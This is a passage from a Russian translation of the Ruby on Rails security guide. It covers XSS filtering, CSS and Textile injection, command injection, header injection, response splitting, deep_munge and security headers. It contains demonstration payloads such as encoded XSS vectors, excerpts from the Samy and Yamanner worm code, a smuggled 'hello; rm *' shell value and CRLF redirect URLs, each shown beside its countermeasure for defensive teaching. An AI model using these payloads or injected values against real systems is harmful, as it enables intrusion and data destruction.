+<p>Это допустит только заданные теги и сделает все хорошо, даже против всех ухищрений и злонамеренных тегов.</p><p>В качестве второго шага, <em>хорошо экранировать весь вывод в приложении</em>, особенно при отображении пользовательского ввода, который не был отфильтрован при вводе (как в примере выше). <em>Используйте метод <code>html_escape()</code> (или его псевдоним <code>h()</code>)</em>, чтобы заменить введенные символы HTML <code>&amp;</code>, <code>&quot;</code>, <code>&lt;</code> и <code>&gt;</code> их неинтерпретируемыми представителями в HTML (<code>&amp;amp;</code>, <code>&amp;quot;</code>, <code>&amp;lt;</code> и <code>&amp;gt;</code>).</p><h6 id='obfustsirovannaya-i-zakodirovannaya-in-ektsiya' class='inside_page_header'><a href="#obfustsirovannaya-i-zakodirovannaya-in-ektsiya">7.3.2.4.</a> Обфусцированная и закодированная инъекция</h6><p>Сетевой трафик главным образом основан на ограниченном Западном алфавите, поэтому новые кодировки символов, такие как Unicode, возникли для передачи символов на других языках. Но это также угроза для веб-приложений, так как злонамеренный код может быть спрятан в различных кодировках, так что веб-браузер сможет его выполнить, а веб-приложение нет. Вот направление атаки в кодировке UTF-8:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;</span>
+  <span class="err">&amp;</span><span class="na">#108</span><span class="err">;&amp;</span><span class="na">#101</span><span class="err">;&amp;</span><span class="na">#114</span><span class="err">;&amp;</span><span class="na">#116</span><span class="err">;&amp;</span><span class="na">#40</span><span class="err">;&amp;</span><span class="na">#39</span><span class="err">;&amp;</span><span class="na">#88</span><span class="err">;&amp;</span><span class="na">#83</span><span class="err">;&amp;</span><span class="na">#83</span><span class="err">;&amp;</span><span class="na">#39</span><span class="err">;&amp;</span><span class="na">#41</span><span class="err">;</span><span class="nt">&gt;</span>
+</code></pre>
+</div>
+<p>Этот пример вызывает окно сообщения. Хотя это распознается фильтром <code>sanitize()</code>. Хорошим инструментом для обфускации и кодирования строк (знайте своего врага!) является <a href="https://hackvertor.co.uk/public">Hackvertor</a>. Метод Rails <code>sanitize()</code> работает хорошо, отражая закодированные атаки.</p><h5 id='primery-iz-proshlogo' class='inside_page_header'><a href="#primery-iz-proshlogo">7.3.3.</a> Примеры из прошлого</h5><p><em>Чтобы понять сегодняшние атаки на веб-приложения, лучше взглянуть на некоторые реальные направления атаки.</em></p><p>Ниже приведена выдержка из <a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa">Js.Yamanner@m Yahoo! почтовый червя</a>. Он появился 11 июня 2006 года и был первым червем для почтового интерфейса:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'</span>
+  <span class="na">target=</span><span class="s">""</span><span class="na">onload=</span><span class="s">"var http_request = false;    var Email = '';
+  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
+"</span><span class="nt">&gt;</span>
+</code></pre>
+</div>
+<p>Черви использовали дыру в фильтре HTML/JavaScript Yahoo, который обычно фильтровал все атрибуты target и onload из тегов (потому что там мог быть JavaScript). Однако фильтр применялся только раз, поэтому атрибут onload с кодом червя оставался. Это хороший пример, почему фильтры списка ограничений никогда не полные, и почему трудно позволить HTML/JavaScript в веб-приложении.</p><p>Другой прототипный веб-почтовый червь Nduja, междоменный червь для четырех итальянских веб-почтовых сервисов. Более детально описано в <a href="http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/">статье Rosario Valotta</a>. Оба почтовых червя имели целью собрать почтовые адреса, на чем преступный хакер мог сделать деньги.</p><p>В декабре 2006 года 34,000 имени фактических пользователей и их пароли были похищены во время <a href="https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">фишинговой атаки на MySpace</a>. Идеей атаки было создание профиля, названного &quot;login_home_index_html&quot;, поэтому URL выглядел очень правдоподобно. Специально созданный HTML и CSS использовался, чтобы скрыть настоящий контент MySpace и вместо этого отразить собственную форму входа.</p><h4 id='css-in-ektsiya' class='inside_page_header'><a href="#css-in-ektsiya">7.4.</a> CSS-инъекция</h4><div class="info"><p><em>CSS-инъекция - это фактически JavaScript-инъекция, поскольку некоторые браузеры (IE, некоторые версии Safari и другие) разрешают JavaScript в CSS. Подумайте дважды о допустимости пользовательского CSS в вашем веб-приложении.</em></p></div><p>CSS-инъекция лучше всего объясняется известным <a href="https://samy.pl/myspace/tech.html">червем MySpace Samy</a>. Этот червь автоматически рассылал предложение дружбы с Samy (злоумышленником), просто посетив его профиль. В течение нескольких часов он сделал свыше 1 миллиона запросов дружбы, но создал так много трафика, что MySpace ушел в оффлайн. Ниже следует техническое объяснение червя.</p><p>MySpace блокировал много тегов, но позволял CSS. Поэтому автор червя поместил JavaScript в CSS следующим образом:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background:url('javascript:alert(1)')"</span><span class="nt">&gt;</span>
+</code></pre>
+</div>
+<p>Таким образом полезная нагрузка происходила через атрибут стиля. Но в полезной нагрузке недопустимы кавычки, так как одинарные и двойные кавычки уже были использованы. Но в JavaScript имеется удобная функция <code>eval()</code>, которая выполняет любую строку как код.</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"mycode"</span> <span class="na">expr=</span><span class="s">"alert('hah!')"</span> <span class="na">style=</span><span class="s">"background:url('javascript:eval(document.all.mycode.expr)')"</span><span class="nt">&gt;</span>
+</code></pre>
+</div>
+<p>Функция <code>eval()</code> - это кошмар для фильтров ввода на основе списка ограничений, так как она позволяет атрибуту стиля спрятать слово &quot;innerHTML&quot;:</p><div class="code_container">
+  <pre><code class="highlight js"><span class="nx">alert</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.body.inne</span><span class="dl">'</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">rHTML</span><span class="dl">'</span><span class="p">));</span>
+</code></pre>
+</div>
+<p>Следующей проблемой было то, что MySpace фильтровал слово <code>&quot;javascript&quot;</code>, поэтому автор использовал <code>&quot;java&lt;NEWLINE&gt;script&quot;</code> чтобы обойти это:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"mycode"</span> <span class="na">expr=</span><span class="s">"alert('hah!')"</span> <span class="na">style=</span><span class="s">"background:url('java↵script:eval(document.all.mycode.expr)')"</span><span class="nt">&gt;</span>
+</code></pre>
+</div>
+<p>Следующей проблемой для автора червя были <a href="#cross-site-request-forgery-csrf">токены безопасности CSRF</a>. Без них он не смог бы послать запросы дружбы через POST. Он обошел это, посылая GET на страницу перед добавлением пользователя и парся результат на токен CSRF.</p><p>В итоге он получил 4 KB червя, которого внедрил в свою страницу профиля.</p><p>Свойство <a href="https://securiteam.com/securitynews/5LP051FHPE">moz-binding</a> CSS предоставляет другой способ внедрить JavaScript в CSS в основанных на Gecko браузерах (Firefox, к примеру).</p><h5 id='kontrmery3' class='inside_page_header'><a href="#kontrmery3">7.4.1.</a> Контрмеры</h5><p>Этот пример снова показывает, что фильтр на основе списка ограничений никогда не полон. Однако, так как пользовательский CSS в веб-приложениях достаточно редкая особенность, трудно найти хороший фильтр CSS на основе списка разрешений. <em>Если хотите разрешить пользовательские цвета или картинки, разрешите выбрать их и создайте CSS в веб-приложении</em>. Используйте метод Rails <code>sanitize()</code> как модель для фильтра CSS на основе списка разрешений, если это действительно нужно.</p><h4 id='in-ektsiya-textile' class='inside_page_header'><a href="#in-ektsiya-textile">7.5.</a> Инъекция Textile</h4><p>Если хотите предоставить форматирование текста иное, чем HTML (для безопасности), используйте разметочный язык, конвертируемый в HTML на сервере. <a href="http://redcloth.org/">RedCloth</a> - это такой язык для Ruby, но без мер предосторожности он также уязвим к XSS.</p><p>Например, RedCloth переводит <code>_test_</code> в <code>&lt;em&gt;test&lt;em&gt;</code>, который делает текст курсивом. Однако, до версии 3.0.4 была уязвимость к XSS. Возьмите <a href="http://www.redcloth.org">новую версию 4</a>, в которой убраны серьезные программные ошибки. Однако даже эта версия имела (на момент написания статьи) <a href="https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">несколько программных ошибок безопасности</a>, поэтому контрмеры только принимались. Вот пример для версии 3.0.4:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1)&lt;/script&gt;'</span><span class="p">).</span><span class="nf">to_html</span>
+<span class="c1"># =&gt; "&lt;script&gt;alert(1)&lt;/script&gt;"</span>
+</code></pre>
+</div>
+<p>Используем опцию <code>:filter_html</code>, чтобы устранить HTML, который не был создан процессором Textile.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1)&lt;/script&gt;'</span><span class="p">,</span> <span class="p">[</span><span class="ss">:filter_html</span><span class="p">]).</span><span class="nf">to_html</span>
+<span class="c1"># =&gt; "alert(1)"</span>
+</code></pre>
+</div>
+<p>Однако, это не отфильтрует весь HTML, некоторые теги останутся (преднамеренно), например <code>&lt;a&gt;</code>:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">RedCloth</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"&lt;a href='javascript:alert(1)'&gt;hello&lt;/a&gt;"</span><span class="p">,</span> <span class="p">[</span><span class="ss">:filter_html</span><span class="p">]).</span><span class="nf">to_html</span>
+<span class="c1"># =&gt; "&lt;p&gt;&lt;a href="javascript:alert(1)"&gt;hello&lt;/a&gt;&lt;/p&gt;"</span>
+</code></pre>
+</div>
+<h5 id='kontrmery4' class='inside_page_header'><a href="#kontrmery4">7.5.1.</a> Контрмеры</h5><p>Рекомендуется <em>использовать RedCloth в сочетании с фильтром ввода на основе списка разрешений</em>, как описано в разделе о контрмерах против XSS.</p><h4 id='ajax-in-ektsii' class='inside_page_header'><a href="#ajax-in-ektsii">7.6.</a> Ajax-инъекции</h4><div class="note"><p><em>Те же меры безопасности должны быть приняты для экшнов Ajax, что и для &quot;нормальных&quot;. Однако, есть как минимум одно исключение: вывод экранируется уже в контроллере, если экшн не рендерит вью.</em></p></div><p>Если используете <a href="https://rubygems.org/gems/in_place_editing">плагин in_place_editor</a> или экшны, возвращающие строку, а не рендерите вью, <em>нужно экранировать возвращаемое значение в экшне</em>. В ином случае, если возвращаемое значение содержит строку с XSS, злонамеренный код выполнится по возвращению в браузер. Экранируйте каждое введенное значение с помощью метода <code>h()</code>.</p><h4 id='in-ektsii-komandnoy-stroki' class='inside_page_header'><a href="#in-ektsii-komandnoy-stroki">7.7.</a> Инъекции командной строки</h4><div class="note"><p><em>Используйте предоставленные пользователем параметры командной строки с предосторожностью</em></p></div><p>Если приложение выполняет команды в лежащей в основе операционной системе, имеется несколько методов в Ruby: <code>system(command)</code>, <code>exec(command)</code>, <code>spawn(command)</code> и <code>command</code>. Вы должны быть особенно осторожны с этими функциями, если пользователь может вводить целые команды или часть их. Это так, потому что во многих оболочках можно выполнять другую команду в конце первой, разделяя их точкой с запятой (<code>;</code>) или вертикальной чертой (<code>|</code>).</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">user_input</span> <span class="o">=</span> <span class="s2">"hello; rm *"</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/echo </span><span class="si">#{</span><span class="n">user_input</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+<span class="c1"># напечатает "hello" и удалит файлы в текущей директории</span>
+</code></pre>
+</div>
+<p>Контрмерой является <em>использование метода <code>system(command, parameters)</code>, который передает параметры командной строки безопасно</em>.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="nb">system</span><span class="p">(</span><span class="s2">"/bin/echo"</span><span class="p">,</span> <span class="s2">"hello; rm *"</span><span class="p">)</span>
+<span class="c1"># напечатает "hello; rm *" и не удалит файлы</span>
+</code></pre>
+</div>
+<h5 id='uyazvimost-kernel-open' class='inside_page_header'><a href="#uyazvimost-kernel-open">7.7.1.</a> Уязвимость Kernel#open</h5><p><code>Kernel#open</code> запускает команды ОС, если аргумент начинается с вертикальной черты (<code>|</code>).</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="nb">open</span><span class="p">(</span><span class="s1">'| ls'</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># возвращает список файлов, как строку, с помощью команды `ls`</span>
+</code></pre>
+</div>
+<p>Контрмерой является использование <code>File.open</code>, <code>IO.open</code> или <code>URI#open</code>. Они не запускают команду ОС.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'| ls'</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># не запускает команду `ls`, всео лишь открывает файл `| ls`, если он существует</span>
+
+<span class="no">IO</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># Открывает stdin. Не принимает строку как аргумент</span>
+
+<span class="nb">require</span> <span class="s1">'open-uri'</span>
+<span class="no">URI</span><span class="p">(</span><span class="s1">'https://example.com'</span><span class="p">).</span><span class="nf">open</span> <span class="p">{</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span> <span class="n">file</span><span class="p">.</span><span class="nf">read</span> <span class="p">}</span>
+<span class="c1"># Открывает URI. `URI()` не принимает `| ls`</span>
+</code></pre>
+</div>
+<h4 id='in-ektsiya-zagolovka' class='inside_page_header'><a href="#in-ektsiya-zagolovka">7.8.</a> Инъекция заголовка</h4><div class="warning"><p><em>Заголовки HTTP динамически генерируются и при определенных обстоятельствах могут быть изменены пользовательским вводом. Это может привести к ложному перенаправлению, XSS или разделению HTTP отклика (HTTP response splitting).</em></p></div><p>Заголовки запроса HTTP имеют поля Referer, User-Agent (клиентское ПО) и Cookie, среди прочих. Заголовки отклика, к примеру, имеют код статуса, Cookie и Location (цель перенаправления на URL). Все они предоставлены пользователем и могут быть манипулированы с большими или меньшими усилиями. <em>Не забывайте экранировать эти поля заголовка тоже.</em> Например, когда Вы отображаете user agent в администраторской зоне.</p><p>Кроме того, <em>важно знать, что делаете, когда создаете заголовки отклика, частично основанные на пользовательском вводе.</em> Например, вы хотите перенаправить пользователя на определенную страницу. Для этого вы представили поле &quot;referer&quot; в форме для перенаправления на заданный адрес:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">redirect_to</span> <span class="n">params</span><span class="p">[</span><span class="ss">:referer</span><span class="p">]</span>
+</code></pre>
+</div>
+<p>Что произойдет, если Rails поместит строку в заголовок <code>Location</code> и пошлет статус 302 (redirect) браузеру. Первое, что сделает злонамеренный пользователь, это:</p><div class="code_container">
+  <pre><code class="highlight plaintext">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
+</code></pre>
+</div>
+<p>И благодаря программной ошибке в (Ruby и) Rails до версии 2.1.2 (исключая ее), хакер мог внедрить произвольные поля заголовка; например, так:</p><div class="code_container">
+  <pre><code class="highlight plaintext">http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:`Hi!
+http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:`http://www.malicious.tld
+</code></pre>
+</div>
+<p>Отметьте, что <code>%0d%0a</code> это URL-закодированные <code>\r\n</code>, являющиеся возвратом каретки и новой строчкой (CRLF) в Ruby. Таким образом, итоговым заголовком HTTP для второго примера будет следующее, поскольку второе поле заголовка Location перезаписывает первое.</p><div class="code_container">
+  <pre><code class="highlight http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
+<span class="s">(...)</span>
+<span class="na">Location</span><span class="p">:</span> <span class="s">http://www.malicious.tld</span>
+</code></pre>
+</div>
+<p>Таким образом, <em>направления атаки для инъекции заголовка основаны на инъекции символов CRLF в поле заголовка.</em> И что сможет сделать злоумышленник с ложным перенаправлением? Он сможет перенаправить на фишинговый сайт, который выглядит так же, как ваш, но просит заново авторизоваться (и посылает учетные данные для входа злоумышленнику). Или он сможет установить злонамеренное ПО, используя дыры в безопасности браузера на этом сайте. Rails 2.1.2 экранирует эти символы для поля Location в методе <code>redirect_to</code>. <em>Убедитесь, что вы делаете то же самое, когда создаете другие поля заголовка на основе пользовательского ввода.</em></p><h5 id='pereprivyazyvanie-dns-i-ataki-na-zagolovok-host' class='inside_page_header'><a href="#pereprivyazyvanie-dns-i-ataki-na-zagolovok-host">7.8.1.</a> Перепривязывание DNS и атаки на заголовок Host</h5><p>Перепривязывание DNS это метод манипулирования разрешением имен домена, который обычно используется в качестве формы компьютерной атаки. Перепривязывание DNS обходит политику ограничения домена системы доменных имен (DNS). Оно перепривязывает домен к другому адресу IP, а затем компрометирует систему, запуская произвольный код на вашем приложении Rails с измененного адреса IP.</p><p>Рекомендуется использовать промежуточную программу <code>ActionDispatch::HostAuthorization</code> для защиты против перепривязывания DNS и других атак на заголовок Host. Она включена по умолчанию в среде development, и вам нужно активировать ее в production и других средах, установив список допустимых хостов. Также можно настроить исключения и установить свое приложение отклика.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">hosts</span> <span class="o">&lt;&lt;</span> <span class="s2">"product.com"</span>
+
+<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">host_authorization</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="c1"># Исключаем запросы для пути /healthcheck/ из проверки хоста</span>
+  <span class="ss">exclude: </span><span class="o">-&gt;</span><span class="p">(</span><span class="n">request</span><span class="p">)</span> <span class="p">{</span> <span class="n">request</span><span class="p">.</span><span class="nf">path</span> <span class="o">=~</span> <span class="sr">/healthcheck/</span> <span class="p">}</span>
+  <span class="c1"># Добавляем произвольное приложение Rack для отклика</span>
+  <span class="ss">response_app: </span><span class="o">-&gt;</span> <span class="n">env</span> <span class="k">do</span>
+    <span class="p">[</span><span class="mi">400</span><span class="p">,</span> <span class="p">{</span> <span class="s2">"Content-Type"</span> <span class="o">=&gt;</span> <span class="s2">"text/plain"</span> <span class="p">},</span> <span class="p">[</span><span class="s2">"Bad Request"</span><span class="p">]]</span>
+  <span class="k">end</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+<p>Подробнее об этом можно прочитать в <a href="/configuring#actiondispatch-hostauthorization">документации по промежуточной программе <code>ActionDispatch::HostAuthorization</code></a></p><h5 id='razdelenie-otklika' class='inside_page_header'><a href="#razdelenie-otklika">7.8.2.</a> Разделение отклика</h5><p>Если инъекция заголовка была возможна, то разделение отклика также возможно. В HTTP блок заголовка заканчивается двумя CRLF, затем идут сами данные (обычно HTML). Идея разделения отклика состоит во внедрении двух CRLF в поле заголовка, после которых следует другой отклик со злонамеренным HTML. Отклик будет таким:</p><div class="code_container">
+  <pre><code class="highlight http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found [First standard 302 response]</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 12 Apr 2005 22:09:07 GMT</span>
+<span class="na">Location</span><span class="p">:</span><span class="s">Content-Type: text/html</span>
+
+
+HTTP/1.1 200 OK [Second New response created by attacker begins]
+Content-Type: text/html
+
+
+&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitary malicious input is
+Keep-Alive: timeout=15, max=100         shown as the redirected page]
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html
+</code></pre>
+</div>
+<p>При определенных обстоятельствах это сможет отобразить зловредный HTML жертве. Однако, это будет работать только с соединениями Keep-Alive (а многие браузеры используют одноразовые соединения). Но нельзя на это полагаться. <em>В любом случае, это серьезная программная ошибка, и следует обновить Rails до версии 2.0.5 или 2.1.2, чтобы устранить риски инъекции заголовка (и поэтому разделения отклика).</em></p><h3 id='unsafe-query-generation' class='inside_page_header'><a href="#unsafe-query-generation">8.</a>  Небезопасная генерация запросов</h3><p>Благодаря способу, которым Active Record интерпретирует параметры, в сочетании со способом, которым Rack парсит параметры запроса, было возможным осуществить неожидаемые запросы в базу данных с условием <code>IS NULL</code>. В качестве отклика на этот вопрос безопасности
+(<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ">CVE-2012-2660</a>,
+<a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ">CVE-2012-2694</a>
+и <a href="https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ">CVE-2013-0155</a>)
+был представлен метод <code>deep_munge</code> в качестве решения, чтобы Rails оставался безопасным по умолчанию.</p><p>Пример уязвимого кода, который мог быть использован злоумышленником, если бы не был выполнен <code>deep_munge</code>:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">unless</span> <span class="n">params</span><span class="p">[</span><span class="ss">:token</span><span class="p">].</span><span class="nf">nil?</span>
+  <span class="n">user</span> <span class="o">=</span> <span class="no">User</span><span class="p">.</span><span class="nf">find_by_token</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:token</span><span class="p">])</span>
+  <span class="n">user</span><span class="p">.</span><span class="nf">reset_password!</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Когда <code>params[:token]</code> один из: <code>[nil]</code>, <code>[nil, nil, ...]</code> или <code>[&#39;foo&#39;, nil]</code>, он прошел бы проверку на <code>nil</code>, но выражение условия <code>IS NULL</code> или <code>IN (&#39;foo&#39;, NULL)</code> все еще было бы добавлено в запрос SQL.</p><p>Чтобы сохранить Rails безопасным по умолчанию, <code>deep_munge</code> заменяет некоторые значения на <code>nil</code>. Нижеследующая таблица показывает, как выглядят параметры, основываясь на запросе <code>JSON</code>:</p><table class='table table-striped'><tr>
+<th>JSON</th>
+<th>Параметры</th>
+</tr>
+<tr>
+<td><code>{ &quot;person&quot;: null }</code></td>
+<td><code>{ :person =&gt; nil }</code></td>
+</tr>
+<tr>
+<td><code>{ &quot;person&quot;: [] }</code></td>
+<td><code>{ :person =&gt; [] }</code></td>
+</tr>
+<tr>
+<td><code>{ &quot;person&quot;: [null] }</code></td>
+<td><code>{ :person =&gt; [] }</code></td>
+</tr>
+<tr>
+<td><code>{ &quot;person&quot;: [null, null, ...] }</code></td>
+<td><code>{ :person =&gt; [] }</code></td>
+</tr>
+<tr>
+<td><code>{ &quot;person&quot;: [&quot;foo&quot;, null] }</code></td>
+<td><code>{ :person =&gt; [&quot;foo&quot;] }</code></td>
+</tr>
+</table><p>Можно вернуть старое поведение и отключить <code>deep_munge</code>, сконфигурировав ваше приложение, если вы знаете об этом риске и знаете, как им управлять:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">perform_deep_munge</span> <span class="o">=</span> <span class="kp">false</span>
+</code></pre>
+</div>
+<h3 id='zagolovki-bezopasnosti-http' class='inside_page_header'><a href="#zagolovki-bezopasnosti-http">9.</a> Заголовки безопасности HTTP</h3><p>Чтобы улучшить безопасность вашего приложения, Rails может быть настроен, чтобы возвращать заголовки безопасности HTTP. Некоторые заголовки настраиваются по умолчанию; иные нужно настраивать явно.</p><h4 id='zagolovki-bezopasnosti-po-umolchaniyu' class='inside_page_header'><a href="#zagolovki-bezopasnosti-po-umolchaniyu">9.1.</a> Заголовки безопасности по умолчанию</h4><p>По умолчанию Rails настроен, чтобы возвращать следующие заголовки отклика. Ваше приложение возвращает эти заголовки для каждого отклика HTTP.</p><h5 id='x-frame-options' class='inside_page_header'><a href="#x-frame-options">9.1.1.</a> <code>X-Frame-Options</code></h5><p>Заголовок <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"><code>X-Frame-Options</code></a> показывает, что браузер может рендерить страницу в теге <code>&lt;frame&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;embed&gt;</code> или <code>&lt;object&gt;</code>. Этот заголовок устанавливает <code>SAMEORIGIN</code> по умолчанию, чтобы разрешить фрейминг только на том же домене. Установите ему <code>DENY</code>, чтобы запретить фрейминг вообще, или уберите этот заголовок вообще, если хотите разрешить фрейминг на всех доменах.</p><h5 id='x-xss-protection' class='inside_page_header'><a href="#x-xss-protection">9.1.2.</a> <code>X-XSS-Protection</code></h5><p><a href="https://owasp.org/www-project-secure-headers/#x-xss-protection">Устаревший заголовок</a>, установлен <code>0</code> в Rails по умолчанию, чтобы отключить проблематичные устаревшие аудиторы XSS.</p><h5 id='x-content-type-options' class='inside_page_header'><a href="#x-content-type-options">9.1.3.</a> <code>X-Content-Type-Options</code></h5><p>Заголовок <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"><code>X-Content-Type-Options</code></a> установлен <code>nosniff</code> в Rails по умолчанию. Он останавливает браузер от угадывания типа MIME файла.</p><h5 id='x-permitted-cross-domain-policies' class='inside_page_header'><a href="#x-permitted-cross-domain-policies">9.1.4.</a> <code>X-Permitted-Cross-Domain-Policies</code></h5><p>Этот заголовок установлен <code>none</code> в Rails по умолчанию. Он не разрешает Adobe Flash и клиентам PDF встраивать вашу страницу на других доменах.</p><h5 id='referrer-policy' class='inside_page_header'><a href="#referrer-policy">9.1.5.</a> <code>Referrer-Policy</code></h5><p>Заголовок <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"><code>Referrer-Policy</code></a> установлен <code>strict-origin-when-cross-origin</code> в Rails по умолчанию. Для запросов с другого источника, он посылает только источник в заголовке Referer. Это предотвращает утечки частных данных, которые могут быть доступны из других частей полного URL, таких как путь и строка запроса.</p><h5 id='nastroyka-zagolovkov-po-umolchaniyu' class='inside_page_header'><a href="#nastroyka-zagolovkov-po-umolchaniyu">9.1.6.</a> Настройка заголовков по умолчанию</h5><p>Эти заголовки настраиваются по умолчанию так:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="s1">'X-Frame-Options'</span> <span class="o">=&gt;</span> <span class="s1">'SAMEORIGIN'</span><span class="p">,</span>
+  <span class="s1">'X-XSS-Protection'</span> <span class="o">=&gt;</span> <span class="s1">'0'</span><span class="p">,</span>
+  <span class="s1">'X-Content-Type-Options'</span> <span class="o">=&gt;</span> <span class="s1">'nosniff'</span><span class="p">,</span>
+  <span class="s1">'X-Permitted-Cross-Domain-Policies'</span> <span class="o">=&gt;</span> <span class="s1">'none'</span><span class="p">,</span>
+  <span class="s1">'Referrer-Policy'</span> <span class="o">=&gt;</span> <span class="s1">'strict-origin-when-cross-origin'</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+<p>Можно переопределить или добавить дополнительные заголовки в <code>config/application.rb</code>.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span><span class="p">[</span><span class="s1">'X-Frame-Options'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'DENY'</span>
+<span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span><span class="p">[</span><span class="s1">'Header-Name'</span><span class="p">]</span>     <span class="o">=</span> <span class="s1">'Value'</span>
+</code></pre>
+</div>
+<p>Или можно убрать их:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span><span class="p">.</span><span class="nf">clear</span>
+</code></pre>
+</div>
+<h4 id='zagolovok-strict-transport-security' class='inside_page_header'><a href="#zagolovok-strict-transport-security">9.2.</a> Заголовок <code>Strict-Transport-Security</code></h4><p>Заголовок отклика HTTP <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"><code>Strict-Transport-Security</code></a> (HTST) указывает браузеру автоматически переходить на HTTPS для текущего и будущих соединений.</p><p>Этот заголовок добавляется в отклик при включении опции <code>force_ssl</code>:</p><div class="code_container">
+  <pre><code class="highlight ruby">  <span class="n">config</span><span class="p">.</span><span class="nf">force_ssl</span> <span class="o">=</span> <span class="kp">true</span>
+</code></pre>
+</div>
